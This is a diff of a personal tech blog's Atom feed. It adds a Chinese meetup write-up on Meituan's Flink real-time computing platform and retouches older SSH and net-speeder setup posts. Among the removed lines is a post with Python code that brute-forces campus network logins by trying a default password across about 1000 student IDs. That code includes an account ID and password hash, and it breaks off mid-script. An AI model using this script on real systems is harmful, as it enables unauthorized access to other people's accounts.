@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://wuchong.me/"/>
-  <updated>2017-07-16T12:49:00.000Z</updated>
+  <updated>2018-08-25T04:41:55.922Z</updated>
   <id>http://wuchong.me/</id>
   
   <author>
@@ -14,6 +14,169 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Flink在美团的实践与应用</title>
+    <link href="http://wuchong.me/blog/2018/08/25/flink-in-meituan-practice/"/>
+    <id>http://wuchong.me/blog/2018/08/25/flink-in-meituan-practice/</id>
+    <published>2018-08-25T03:38:58.000Z</published>
+    <updated>2018-08-25T04:41:55.922Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote>
+<p>作者：刘迪珊<br>整理：上海-星辰（Flink China社区志愿者）<br>本文整理自8月11日在北京举行的Flink<br>Meetup，分享嘉宾刘迪珊(2015年加入美团数据平台。致力于打造高效、易用的实时计算平台，探索不同场景下实时应用的企业级解决方案及统⼀化服务)。</p>
+</blockquote>
+<h2 id="美团实时计算平台现状和背景"><a href="#美团实时计算平台现状和背景" class="headerlink" title="美团实时计算平台现状和背景"></a>美团实时计算平台现状和背景</h2><h3 id="实时平台架构"><a href="#实时平台架构" class="headerlink" title="实时平台架构"></a>实时平台架构</h3><p><img src="http://ww1.sinaimg.cn/large/81b78497gy1fultlwgxz7j21fu0rowj0.jpg" alt=""></p>
+<p>上图呈现的是当前美团实时计算平台的简要架构。最底层是数据缓存层，可以看到美团测的所有日志类的数据，都是通过统一的日志收集系统收集到Kafka。Kafka作为最大的数据中转层，支撑了美团线上的大量业务，包括离线拉取，以及部分实时处理业务等。在数据缓存层之上，是一个引擎层，这一层的左侧是我们目前提供的实时计算引擎，包括Storm和Flink。Storm在此之前是 standalone 模式的部署方式，Flink由于其现在运行的环境，美团选择的是On YARN模式，除了计算引擎之外，我们还提供一些实时存储功能，用于存储计算的中间状态、计算的结果、以及维度数据等，目前这一类存储包含Hbase、Redis以及ES。在计算引擎之上，是趋于五花八门的一层，这一层主要面向数据开发的同学。实时数据开发面临诸多问题，例如在程序的调试调优方面就要比普通的程序开发困难很多。在数据平台这一层，美团面向用户提供的实时计算平台，不仅可以托管作业，还可以实现调优诊断以及监控报警，此外还有实时数据的检索以及权限管理等功能。除了提供面向数据开发同学的实时计算平台，美团现在正在做的事情还包括构建元数据中心。这也是未来我们想做SQL的一个前提，元数据中心是承载实时流系统的一个重要环节，我们可以把它理解为实时系统中的大脑，它可以存储数据的Schema，Meta。架构的最顶层就是我们现在实时计算平台支撑的业务，不仅包含线上业务日志的实时查询和检索，还涵盖当下十分热门的实时机器学习。机器学习经常会涉及到搜索和推荐场景，这两个场景最显著特点：一、会产生海量实时数据；二、流量的QPS相当高。此时就需要实时计算平台承载部分实时特征的提取工作，实现应用的搜索推荐服务。还有一类是比较常见的场景，包括实时的特征聚合，斑马Watcher（可以认为是一个监控类的服务），实时数仓等。</p>
+<p>以上就是美团目前实时计算平台的简要架构。</p>
+<h3 id="实时平台现状"><a href="#实时平台现状" class="headerlink" title="实时平台现状"></a>实时平台现状</h3><p>美团实时计算平台的现状是作业量现在已经达到了近万，集群的节点的规模是千级别的，天级消息量已经达到了万亿级，高峰期的消息量能够达到千万条每秒。</p>
+<p><img src="http://ww1.sinaimg.cn/large/81b78497gy1fultsobawtj21dc09gjtd.jpg" alt=""></p>
+<h3 id="痛点和问题"><a href="#痛点和问题" class="headerlink" title="痛点和问题"></a>痛点和问题</h3><p>美团在调研使用Flink之前遇到了一些痛点和问题:</p>
+<ul>
+<li><p>实时计算精确性问题：在调研使用Flink之前美团很大规模的作业是基于Storm去开发的，Storm主要的计算语义是At-Least-Once，这种语义在保证正确性上实际上是有一些问题的，在Trident之前Storm是无状态的处理。虽然Storm<br>Trident提供了一个维护状态的精确的开发，但是它是基于串行的Batch提交的，那么遇到问题在处理性能上可能会有一点瓶颈。并且Trident是基于微批的处理，在延迟上没有达到比较高的要求，所以不能满足一些对延迟比较高需求的业务。</p>
+</li>
+<li><p>流处理中的状态管理问题：基于之前的流处理过程中状态管理的问题是非常大的一类问题。状态管理除了会影响到比如说计算状态的一致性，还会影响到实时计算处理的性能以及故障恢复时候的能力。而Flink最突出的一个优势就是状态管理。</p>
+</li>
+<li><p>实时计算表义能力的局限性：在实时计算之前很多公司大部分的数据开发还是面向离线的场景，近几年实时的场景也慢慢火热起来了。那与离线的处理不同的是，实时的场景下，数据处理的表意能力可能有一定的限制，比如说他要进行精确计算以及时间窗口都是需要在此之上去开发很多功能性的东西。</p>
+</li>
+<li><p>开发调试成本高：近千结点的集群上已经跑了近万的作业，分布式的处理的引擎，手工写代码的方式，给数据开发的同学也带来了很高开发和调试的成本，再去维护的时候，运维成本也比较高。</p>
+</li>
+</ul>
+<h3 id="Flink探索关注点"><a href="#Flink探索关注点" class="headerlink" title="Flink探索关注点"></a>Flink探索关注点</h3><p>在上面这些痛点和问题的背景下，美团从去年开始进行Flink的探索，关注点主要有以下4个方面：</p>
+<ul>
+<li><p>ExactlyOnce计算能力</p>
+</li>
+<li><p>状态管理能力</p>
+</li>
+<li><p>窗口/Join/时间处理等等</p>
+</li>
+<li><p>SQL/TableAPI</p>
+</li>
+</ul>
+<h2 id="Flink在美团的实践"><a href="#Flink在美团的实践" class="headerlink" title="Flink在美团的实践"></a>Flink在美团的实践</h2><p>下面带大家来看一下，美团从去年投入生产过程中都遇到了哪些问题，以及一些解决方案，分为下面三个部分：</p>
+<h3 id="稳定性实践"><a href="#稳定性实践" class="headerlink" title="稳定性实践"></a>稳定性实践</h3><h4 id="稳定性实践-资源隔离"><a href="#稳定性实践-资源隔离" class="headerlink" title="稳定性实践-资源隔离"></a>稳定性实践-资源隔离</h4><ul>
+<li><p>资源隔离的考虑：分场景、按业务</p>
+<ol>
+<li>高峰期不同，运维时间不同；</li>
+<li>可靠性、延迟需求不同；</li>
+<li>应用场景，重要性不同</li>
+</ol>
+</li>
+<li><p>资源隔离的策略：</p>
+<ol>
+<li>YARN打标签，节点物理隔离；</li>
+<li>离线DataNode与实时计算节点的隔离</li>
+</ol>
+</li>
+</ul>
+<p><img src="http://ww1.sinaimg.cn/large/81b78497gy1fultv3strfj20qu0bqq3y.jpg" alt=""></p>
+<h4 id="稳定性实践-智能调度"><a href="#稳定性实践-智能调度" class="headerlink" title="稳定性实践-智能调度"></a>稳定性实践-智能调度</h4><p><img src="http://ww1.sinaimg.cn/large/81b78497gy1fultytaxupj20ng0mijte.jpg" alt=""></p>
+<p>智能调度目的也是为了解决资源不均的问题，现在普通的调度策略就是基于CPU，基于内存去调度的。除此之外，在生产过程中也发现了一些其他的问题，比如说Flink是会依赖本地磁盘，进行依赖本地磁盘做本地的状态的存储，所以磁盘IO，还有磁盘的容量，也是一类考虑的问题点，除此之外还包括网卡流量，因为每个业务的流量的状态是不一样的，分配进来会导致流量的高峰，把某一个网卡打满，从而影响其他业务，所以期望的话是说做一些智能调度化的事情。目前暂时能做到的是从cpu和内存两方面，未来会从其他方面做一些更优的调度策略。</p>
+<h4 id="稳定性实践-故障容错"><a href="#稳定性实践-故障容错" class="headerlink" title="稳定性实践-故障容错"></a>稳定性实践-故障容错</h4><ul>
+<li><p>节点/网络故障</p>
+<ul>
+<li><p>JobManagerHA</p>
+</li>
+<li><p>自动拉起</p>
+</li>
+</ul>
+</li>
+</ul>
+<p>与Storm不同的是，知道Storm在遇到异常的时候是非常简单粗暴的，比如说有发生了异常，可能用户没有在代码中进行比较规范的异常处理，但是没有关系，因为worker会重启作业还会继续执行，并且他保证的是At-Least-Once这样的语义，比如说一个网络超时的异常对他而言影响可能并没有那么大，但是Flink不同的是他对异常的容忍度是非常的苛刻的，那时候就考虑的是比如说会发生节点或者是网络的故障，那JobManager单点问题可能就是一个瓶颈，JobManager那个如果挂掉的话，那么可能对整个作业的影响就是不可回复的，所以考虑了做HA，另外一个就是会去考虑一些由于运维的因素而导致的那作业，还有除此之外，可能有一些用户作业是没有开启CheckPoint，但如果是因为节点或者是网络故障导致挂掉，希望会在平台内层做一些自动拉起的策略，去保证作业运行的稳定性。</p>
+<ul>
+<li><p>上下游容错</p>
+<ul>
+<li>FlinkKafka08异常重试</li>
+</ul>
+</li>
+</ul>
+<p>我们的数据源主要是Kafka，读写Kafka是一类非常常见的实时流处理避不开的一个内容，而Kafka本身的集群规模是非常比较大的，因此节点的故障出现是一个常态问题，在此基础上我们对节点故障进行了一些容错，比如说节点挂掉或者是数据均衡的时候，Leader会切换，那本身Flink的读写对Leader的切换容忍度没有那么高，在此基础上我们对一些特定场景的，以及一些特有的异常做的一些优化，进行了一些重试。</p>
+<ul>
+<li><p>容灾</p>
+<ul>
+<li><p>多机房</p>
+</li>
+<li><p>流热备</p>
+</li>
+</ul>
+</li>
+</ul>
+<p>容灾可能大家对考虑的并不多，比如说有没有可能一个机房的所有的节点都挂掉了，或者是无法访问了，虽然它是一个小概率的事件，但它也是会发生的。所以现在也会考虑做多机房的一些部署，包括还有Kafka的一些热备。</p>
+<h3 id="Flink平台化"><a href="#Flink平台化" class="headerlink" title="Flink平台化"></a>Flink平台化</h3><h4 id="Flink平台化-作业管理"><a href="#Flink平台化-作业管理" class="headerlink" title="Flink平台化-作业管理"></a>Flink平台化-作业管理</h4><p>在实践过程中，为了解决作业管理的一些问题，减少用户开发的一些成本，我们做了一些平台化的工作，下图是一个作业提交的界面展示，包括作业的配置，作业生命周期的管理，报警的一些配置，延迟的展示，都是集成在实时计算平台的。</p>
+<p><img src="http://ww1.sinaimg.cn/large/81b78497gy1fultzv8jrhj21760ma446.jpg" alt=""></p>
+<h4 id="Flink平台化-监控报警"><a href="#Flink平台化-监控报警" class="headerlink" title="Flink平台化-监控报警"></a>Flink平台化-监控报警</h4><p>在监控上我们也做了一些事情，对于实时作业来讲，对监控的要求会更高，比如说在作业延迟的时候对业务的影响也比较大，所以做了一些延迟的报警，包括作业状态的报警，比如说作业存活的状态，以及作业运行的状态，还有未来会做一些自定义Metrics的报警。自定义Metrics是未来会考虑基于作业处理本身的内容性，做一些可配置化的一些报警。</p>
+<h4 id="Flink平台化-调优诊断"><a href="#Flink平台化-调优诊断" class="headerlink" title="Flink平台化-调优诊断"></a>Flink平台化-调优诊断</h4><ul>
+<li><p>实时计算引擎提供统一日志和Metrics方案</p>
+</li>
+<li><p>为业务提供按条件过滤的日志检索</p>
+</li>
+<li><p>为业务提供自定义时间跨度的指标查询</p>
+</li>
+<li><p>基于日志和指标，为业务提供可配置的报警</p>
+</li>
+</ul>
+<p>另外就是刚刚提到说在开发实时作业的时候，调优和诊断是一个比较难的痛点，就是用户不是很难去查看分布式的日志，所以也提供了一套统一的解决方案。这套解决方案主要是针对日志和Metrics，会在针对引擎那一层做一些日志和Metrics的上报，那么它会通过统一的日志收集系统，将这些原始的日志，还有Metrics汇集到Kafka那一层。今后Kafka这一层大家可以发现它有两个下游，一方面是做日志到ES的数据同步，目的的话是说能够进入日志中心去做一些日志的检索，另外一方面是通过一些聚合处理流转到写入到OpenTSDB把数据做依赖，这份聚合后的数据会做一些查询，一方面是Metrics的查询展示，另外一方面就是包括实做的一些相关的报警。</p>
+<p><img src="http://ww1.sinaimg.cn/large/81b78497gy1fulu0py17bj20tc0ysadu.jpg" alt=""></p>
+<p>下图是当前某一个作业的一个可支持跨天维度的Metrics的一个查询的页面。可以看到说如果是能够通过纵向的对比，可以发现除了作业在某一个时间点是因为什么情况导致的？比如说延迟啊这样容易帮用户判断一些他的做作业的一些问题。除了作业的运行状态之外，也会先就是采集一些节点的基本信息作为横向的对比</p>
+<p><img src="http://ww1.sinaimg.cn/large/81b78497gy1fulu1nzne4j20xi0xqgv2.jpg" alt=""></p>
+<p>下图是当前的日志的一些查询，它记录了，因为作业在挂掉之后，每一个ApplicationID可能会变化，那么基于作业唯一的唯一的主键作业名去搜集了所有的作业，从创建之初到当前运行的日志，那么可以允许用户的跨Application的日志查询。</p>
+<p><img src="http://ww1.sinaimg.cn/large/81b78497gy1fulu2b199ej21ju0wgqhl.jpg" alt=""></p>
+<h4 id="生态建设"><a href="#生态建设" class="headerlink" title="生态建设"></a>生态建设</h4><p>为了适配这两类MQ做了不同的事情，对于线上的MQ，期望去做一次同步多次消费，目的是避免对线上的业务造成影响，对于的生产类的Kafka就是线下的Kafka，做了一些地址的地址的屏蔽，还有基础基础的一些配置，包括一些权限的管理，还有指标的采集。</p>
+<h3 id="Flink在美团的应用"><a href="#Flink在美团的应用" class="headerlink" title="Flink在美团的应用"></a>Flink在美团的应用</h3><p>下面会给大家讲两个Flink在美团的真实使用的案例。第一个是Petra，Petra其实是一个实时指标的一个聚合的系统，它其实是面向公司的一个统一化的解决方案。它主要面向的业务场景就是基于业务的时间去统计，还有计算一些实时的指标，要求的话是低时延，他还有一个就是说，因为它是面向的是通用的业务，由于业务可能是各自会有各自不同的维度，每一个业务可能包含了包括应用通道机房，还有其他的各自应用各个业务特有的一些维度，而且这些维度可能涉及到比较多，另外一个就是说它可能是就是业务需要去做一些复合的指标的计算，比如说最常见的交易成功率，他可能需要去计算支付的成功数，还有和下单数的比例。另外一个就是说统一化的指标聚合可能面向的还是一个系统，比如说是一些B端或者是R段的一些监控类的系统，那么系统对于指标系统的诉求，就是说我希望指标聚合能够最真最实时最精确的能够产生一些结果，数据保证说它的下游系统能够真实的监控到当前的信息。右边图是我当一个Metrics展示的一个事例。可以看到其他其实跟刚刚讲也是比较类似的，就是说包含了业务的不同维度的一些指标汇聚的结果。</p>
+<h4 id="Petra实时指标聚合"><a href="#Petra实时指标聚合" class="headerlink" title="Petra实时指标聚合"></a>Petra实时指标聚合</h4><ul>
+<li><p>业务场景：</p>
+<ul>
+<li><p>基于业务时间（事件时间）</p>
+</li>
+<li><p>多业务维度：如应用、通道、机房等</p>
+</li>
+<li><p>复合指标计算：如交易成功率=支付成功数/下单数</p>
+</li>
+<li><p>低延迟：秒级结果输出</p>
+</li>
+</ul>
+</li>
+</ul>
+<p><img src="http://ww1.sinaimg.cn/large/81b78497gy1fulu3p0o28j216i0o8wwi.jpg" alt=""></p>
+<ul>
+<li><p>Exactlyonce的精确性保障</p>
+<ul>
+<li>Flinkcheckpoint机制</li>
+</ul>
+</li>
+<li><p>维度计算中数据倾斜</p>
+<ul>
+<li>热点key散列</li>
+</ul>
+</li>
+<li><p>对晚到数据的容忍能力</p>
+<ul>
+<li>窗口的设置与资源的权衡</li>
+</ul>
+</li>
+</ul>
+<p><img src="http://ww1.sinaimg.cn/large/81b78497gy1fulu5f77kbj20s40wgq6p.jpg" alt=""></p>
+<p>在用Flink去做实时指标复核的系统的时候，着重从这几方面去考虑了。第一个方面是说精确的计算，包括使用了FLink和CheckPoint的机制去保证说我能做到不丢不重的计算，第一个首先是由统一化的Metrics流入到一个预聚合的模块，预聚合的模块主要去做一些初始化的一些聚合，其中的为什么会分预聚合和全量聚合主要的解决一类问题，包括就刚刚那位同学问的一个问题，就是数据倾斜的问题，比如说在热点K发生的时候，当前的解决方案也是通过预聚合的方式去做一些缓冲，让尽量把K去打散，再聚合全量聚合模块去做汇聚。那其实也是只能解决一部分问题，所以后面也考虑说在性能的优化上包括去探索状态存储的性能。下面的话还是包含晚到数据的容忍能力，因为指标汇聚可能刚刚也提到说要包含一些复合的指标，那么符合的指标所依赖的数据可能来自于不同的流，即便来自于同一个流，可能每一个数据上报的时候，可能也会有晚到的情况发生，那时候需要去对数据关联做晚到的容忍，容忍的一方面是说可以设置晚到的Lateness的延迟，另一方面是可以设置窗口的长度，但是其实在现实的应用场景上，其实还有一方面考虑就是说除了去尽量的去拉长时间，还要考虑真正的计算成本，所以在这方面也做了一些权衡，那么指标基本就是经过全量聚合之后，聚合结果会回写Kafka，经过数据同步的模块写到OpenTSDB去做，最后去grafana那做指标的展示，另一方面可能去应用到通过Facebook包同步的模块去同步到报警的系统里面去做一些指标，基于指标的报警。</p>
+<p>下图是现在提供的产品化的Petra的一个展示的机示意图，可以看到目前的话就是定义了某一些常用的算子，以及维度的配置，允许用户进行配置话的处理，直接去能够获取到他期望要的指标的一个展示和汇聚的结果。目前还在探索说为Petra基于Sql做一些事情，因为很多用户也比较就是在就是习惯上也可以倾向于说我要去写Sql去完成这样的统计，所以也会基于此说依赖Flink的本身的对SQl还有TableAPI的支持，也会在Sql的场景上进行一些探索。</p>
+<p><img src="http://ww1.sinaimg.cn/large/81b78497gy1fulu5waxu9j21be0twwng.jpg" alt=""></p>
+<h3 id="MLX机器学习平台"><a href="#MLX机器学习平台" class="headerlink" title="MLX机器学习平台"></a>MLX机器学习平台</h3><hr>
+<p>第二类应用就是机器学习的一个场景，机器学习的场景可能会依赖离线的特征数据以及实时的特征数据。一个是基于现有的离线场景下的特征提取，经过了批处理，流转到了离线的集群。另外一个就是近线模式，近线模式出的数据就是现有的从日志收集系统流转过来的统一的日志，经过Flink的处理，就是包括流的关联以及特征的提取，再做模型的训练，流转到最终的训练的集群，训练的集群会产出P的特征，还有都是Delta的特征，最终将这些特征影响到线上的线上的特征的一个训练的一个服务上。这是一个比较常见的，比如说比较就是通用的也是比较通用的一个场景，目前的话主要应用的方可能包含了搜索还有推荐，以及一些其他的业务。</p>
+<p><img src="http://ww1.sinaimg.cn/large/81b78497gy1fulu6o90adj21bg0x8n5m.jpg" alt=""></p>
+<h2 id="未来展望"><a href="#未来展望" class="headerlink" title="未来展望"></a>未来展望</h2><p>未来的话可能也是通过也是期望在这三方面进行做一些更多的事情，刚刚也提到了包括状态的管理，第一个是状态的统一的，比如说Sql化的统一的管理，希望有统一的配置，帮用户去选择一些期望的回滚点。另外一个就是大状态的性能优化，因为比如说像做一些流量数据的双流的关联的时候，现在也遇到了一些性能瓶颈的问题，对于说啊基于内存型的状态，基于内存型的数据的处理，以及基于RocksDB的状态的处理，做过性能的比较，发现其实性能的差异还是有一些大的，所以希望说在基于RocksDBBackend的上面能够去尽量去更多的做一些优化，从而提升作业处理的性能。第二方面就是Sql，Sql的话应该是每一个位就是当前可能各个公司都在做的一个方向，因为之前也有对Sql做一些探索，包括提供了基于Storm的一些Sql的表示，但是可能对于之前的话对于与语义的表达可能会有一些欠缺，所以希望说在基于Flink可去解决这些方面的事情，以及包括Sql的并发度的一些配置的优化，包括Sql的查询的一些优化，都希望说在Flink未来能够去优化更多的东西，去真正能使Sql应用到生产的环境。</p>
+<p>另外一方面的话就是会进行新的场景的也在做新的场景的一些探索，期望是比如说包括刚刚也提到说除了流式的处理，也期望说把离线的场景下的数据进行一些合并，通过统一的Sql的API去提供给业务做更多的服务，包括流处理，还有批处理的结合。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      本文整理自8月11日在北京举行的Flink Meetup。美团目前主要用到的实时计算引擎是 Flink 和 Storm。Storm 采用的是 standalone 模式部署，Flink 采用的是 ON YARN 的模式不是。由于 Flink 很多设计上的优越性，美团现在大量的业务正在基于 Flink 搭建。
+    
+    </summary>
+    
+      <category term="Flink" scheme="http://wuchong.me/categories/Flink/"/>
+    
+    
+      <category term="Flink" scheme="http://wuchong.me/tags/Flink/"/>
+    
+  </entry>
   
   <entry>
     <title>我在阿里的这两年</title>
@@ -2209,7 +2372,7 @@
 <h3 id="配置hosts"><a href="#配置hosts" class="headerlink" title="配置hosts"></a>配置hosts</h3><p>在每台主机上修改host文件<br><figure class="highlight lsl"><table><tr><td class="code"><pre><div class="line">vi /etc/hosts</div><div class="line"></div><div class="line"><span class="number">10.1</span><span class="number">.1</span><span class="number">.107</span>      master</div><div class="line"><span class="number">10.1</span><span class="number">.1</span><span class="number">.108</span>      slave1</div><div class="line"><span class="number">10.1</span><span class="number">.1</span><span class="number">.109</span>      slave2</div></pre></td></tr></table></figure></p>
 <p>配置之后ping一下用户名看是否生效<br><figure class="highlight autoit"><table><tr><td class="code"><pre><div class="line"><span class="built_in">ping</span> slave1</div><div class="line"><span class="built_in">ping</span> slave2</div></pre></td></tr></table></figure></p>
 <h3 id="SSH-免密码登录"><a href="#SSH-免密码登录" class="headerlink" title="SSH 免密码登录"></a>SSH 免密码登录</h3><p>安装Openssh server<br><figure class="highlight sql"><table><tr><td class="code"><pre><div class="line">sudo apt-get <span class="keyword">install</span> openssh-<span class="keyword">server</span></div></pre></td></tr></table></figure></p>
-<p>在所有机器上都生成私钥和公钥<br><figure class="highlight 1c"><table><tr><td class="code"><pre><div class="line">ssh-keygen -t rsa   <span class="meta">#一路回车</span></div></pre></td></tr></table></figure></p>
+<p>在所有机器上都生成私钥和公钥<br><figure class="highlight python"><table><tr><td class="code"><pre><div class="line">ssh-keygen -t rsa   <span class="comment">#一路回车</span></div></pre></td></tr></table></figure></p>
 <p>需要让机器间都能相互访问，就把每个机子上的<code>id_rsa.pub</code>发给master节点，传输公钥可以用scp来传输。<br><figure class="highlight stylus"><table><tr><td class="code"><pre><div class="line">scp ~/.ssh/id_rsa<span class="selector-class">.pub</span> spark@master:~/.ssh/id_rsa<span class="selector-class">.pub</span><span class="selector-class">.slave1</span></div></pre></td></tr></table></figure></p>
 <p>在master上，将所有公钥加到用于认证的公钥文件<code>authorized_keys</code>中<br><figure class="highlight ruby"><table><tr><td class="code"><pre><div class="line">cat ~<span class="regexp">/.ssh/id</span>_rsa.pub* <span class="meta">&gt;&gt; </span>~<span class="regexp">/.ssh/authorized</span>_keys</div></pre></td></tr></table></figure></p>
 <p>将公钥文件<code>authorized_keys</code>分发给每台slave<br><figure class="highlight elixir"><table><tr><td class="code"><pre><div class="line">scp ~<span class="regexp">/.ssh/authorized</span>_keys spark<span class="variable">@slave1</span><span class="symbol">:~/</span>.ssh/</div></pre></td></tr></table></figure></p>
@@ -2466,7 +2629,7 @@
 <p><strong>(2) Centos 下安装依赖包</strong><br>需要配置 epel 第三方源。下载 epel ：<a href="http://dl.fedoraproject.org/pub/epel/" target="_blank" rel="external">http://dl.fedoraproject.org/pub/epel/</a> 。例如，Centos 7 x64：<br><figure class="highlight awk"><table><tr><td class="code"><pre><div class="line">wget http:<span class="regexp">//</span>dl.fedoraproject.org<span class="regexp">/pub/</span>epel<span class="regexp">/7/</span>x86_64<span class="regexp">/e/</span>epel-release-<span class="number">7</span>-<span class="number">5</span>.noarch.rpm</div><div class="line">rpm -ivh epel-release-<span class="number">7</span>-<span class="number">5</span>.noarch.rpm</div><div class="line">yum repolist</div></pre></td></tr></table></figure></p>
 <p>然后安装依赖包：<br><figure class="highlight cmake"><table><tr><td class="code"><pre><div class="line">yum <span class="keyword">install</span> libnet libpcap libnet-devel libpcap-devel</div></pre></td></tr></table></figure></p>
 <p><strong>(3) 下载官方的 tar.gz 压缩包。解压安装运行：</strong><br><figure class="highlight vim"><table><tr><td class="code"><pre><div class="line">wget http://net-speeder.googlecode.<span class="keyword">com</span>/<span class="keyword">files</span>/net_speeder-v0.<span class="number">1</span>.tar.gz </div><div class="line">tar zxvf net_speeder-v0.<span class="number">1</span>.tar.gz</div><div class="line"><span class="keyword">cd</span> net_speeder</div><div class="line">chmod <span class="number">777</span> *</div><div class="line"><span class="keyword">sh</span> build.<span class="keyword">sh</span> -DCOOKED</div></pre></td></tr></table></figure></p>
-<p>首先你需要知道你的网卡设备名，可以使用 ifconfig 查看。假设是eth0，那么运行方法是:<br><figure class="highlight 1c"><table><tr><td class="code"><pre><div class="line">./net_speeder eth0 <span class="string">"ip"</span></div></pre></td></tr></table></figure></p>
+<p>首先你需要知道你的网卡设备名，可以使用 ifconfig 查看。假设是eth0，那么运行方法是:<br><figure class="highlight python"><table><tr><td class="code"><pre><div class="line">./net_speeder eth0 <span class="string">"ip"</span></div></pre></td></tr></table></figure></p>
 <p>关闭 net-speeder<br><figure class="highlight nginx"><table><tr><td class="code"><pre><div class="line"><span class="attribute">killall</span> net_speeder</div></pre></td></tr></table></figure></p>
 <p>哦，对了，作者已经将 net-speeder 迁移到 <a href="https://github.com/snooda/net-speeder" target="_blank" rel="external">GitHub</a> 了，感兴趣的可以关注、贡献。</p>
 <p>以上几种方法是我用过的几种比较有效的加速方法。有任何错误之处还请在下面留言指出。</p>
@@ -3513,51 +3676,6 @@
       <category term="Linux基础" scheme="http://wuchong.me/tags/Linux%E5%9F%BA%E7%A1%80/"/>
     
       <category term="文件系统" scheme="http://wuchong.me/tags/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>用Python模拟登录“借”上网帐号</title>
-    <link href="http://wuchong.me/blog/2014/07/16/use-python-login-borrow-account/"/>
-    <id>http://wuchong.me/blog/2014/07/16/use-python-login-borrow-account/</id>
-    <published>2014-07-16T08:22:57.000Z</published>
-    <updated>2016-03-08T12:20:05.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>昨天同学让我帮忙下篇论文，发现自己的校内上网帐号有一段时间没充值了。登录校园网才能下论文，无奈问了周围的人却发现都没充值！（实验室可以免费上网大家都不充值了么）</p>
-<p>懒得去充值，就想会不会有的上网帐号还是用的默认密码？如果有的话，岂不是可以“借来”用一下！虽然有些不道德，但是为了验证心里的想法还是忍不住下手了。</p>
-<h2 id="分析请求"><a href="#分析请求" class="headerlink" title="分析请求"></a>分析请求</h2><p>首先当然是分析登录请求啦。我们学校的校园网登录网址为<code>10.0.0.55</code>。所以用 Chrome 打开登录网页，并打开<code>开发者工具 -&gt; Network</code>，再输入用户名密码，点击登录。可以捕获到 POST 消息。</p>
-<p><img src="http://ww1.sinaimg.cn/mw690/81b78497jw1eiepcju7vuj20yw0gogoo.jpg" alt=""></p>
-<p>其中最重要的是两个信息，一个是 Request URL，另一个是 Form Data。前者是提交请求的网址，后者是提交的表单。表单里最重要的是 username 和 password 两个字段。后面的三个字段可以忽略。我们发现，表单中的密码是加密后提交的。会用的什么加密呢？我们去 JS 脚本里找找有什么。</p>
-<p><img src="http://ww2.sinaimg.cn/mw690/81b78497jw1eiepcjd6suj20yq0gswhi.jpg" alt=""></p>
-<p>在源代码的 head 标签内发现了大段的 JS 脚本，其中就有关于登录的。其实就是用了简单的 MD5 加密，并将加密结果截取了第 8 到 24 的字符。连 salt 都没有用到。</p>
-<p>有了上面这些信息后，我们就可以构造请求了。这当然要拿出 Python 大法了。<br><a id="more"></a></p>
-<h2 id="模拟登录"><a href="#模拟登录" class="headerlink" title="模拟登录"></a>模拟登录</h2><p>用 Python 可以快速实现模拟登录，主要使用了 <code>requests</code> 库。</p>
-<figure class="highlight livescript"><table><tr><td class="code"><pre><div class="line"><span class="comment">#encoding=utf8</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line"><span class="comment">### 登录页的url</span></div><div class="line">url = <span class="string">'http://10.0.0.55/cgi-bin/do_login'</span></div><div class="line"><span class="comment">### 有些网站反爬虫，这里用headers把程序伪装成浏览器</span></div><div class="line">header = &#123; <span class="string">'User-Agent'</span> : <span class="string">'Mozilla/5.0 (Windows NT 6.1)</span></div><div class="line"> AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36' &#125;</div><div class="line"><span class="comment">### 登录需要提交的表单</span></div><div class="line">form_data = &#123;<span class="string">'username'</span>:<span class="string">'2220130260'</span>, <span class="comment">#填入网站的上网帐号</span></div><div class="line">    <span class="string">'password'</span>:<span class="string">'8ad9902aecba32e2'</span>,  <span class="comment">#填入网站密码（加密后的）</span></div><div class="line">    <span class="string">'drop'</span>:<span class="number">0</span>,</div><div class="line">    <span class="string">'type'</span>:<span class="number">1</span>,</div><div class="line">    <span class="string">'n'</span>:<span class="number">100</span></div><div class="line">    &#125;</div><div class="line">s = requests.session()</div><div class="line">response = s.post(url,data = form_data,headers = header)</div><div class="line"><span class="built_in">print</span> response.text</div></pre></td></tr></table></figure>
-<p>最终读取 response 的结果，我们可以判断登录是否成功。例如，上述代码运行的结果是<code>password_error</code>。</p>
-<h2 id="借帐号"><a href="#借帐号" class="headerlink" title="借帐号"></a>借帐号</h2><p>有了上面的模拟登录，我们就可以把它写成脚本，遍历成百上千个帐号。其实就是用循环构造每一个表单。</p>
-<p>这里密码我们使用 <code>hashlib</code> 库来完成 MD5 加密。至于上网帐号，一般都是用学生学号作为上网帐号的，就拿最小的 13 级本科生开刀吧（谁让你们年少无知呢，记得改密码）。像 13 级本科生的学校是 <code>112013</code> 开头，我们就循环前 1000 个学生。</p>
-<p>直接给出脚本代码吧！</p>
-<figure class="highlight ruby"><table><tr><td class="code"><pre><div class="line"><span class="comment">#encoding=utf8</span></div><div class="line">import requests</div><div class="line">import hashlib</div><div class="line"></div><div class="line"><span class="comment">###登录页的url</span></div><div class="line">url = <span class="string">'http://10.0.0.55/cgi-bin/do_login'</span></div><div class="line"><span class="comment">###有些网站反爬虫，这里用headers把程序伪装成浏览器</span></div><div class="line">header = &#123; <span class="string">'User-Agent'</span> : <span class="string">'Mozilla/5.0 (Windows NT 6.1)</span></div><div class="line"> AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36' &#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(str)</span></span>:</div><div class="line">    m = hashlib.md5()</div><div class="line">    m.update(str)</div><div class="line">    <span class="keyword">return</span> m.hexdigest()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(form_data)</span></span>:</div><div class="line">    s = requests.session()</div><div class="line">    <span class="comment">#发出请请求</span></div><div class="line">    response = s.post(url,data = form_data,headers = header)</div><div class="line">    <span class="keyword">return</span> response.content</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">tryAccount</span><span class="params">(id_start,id_end,default_pass)</span></span>:</div><div class="line">    <span class="comment">###登录需要提交的表单</span></div><div class="line">    form_data = &#123;<span class="string">'username'</span><span class="symbol">:<span 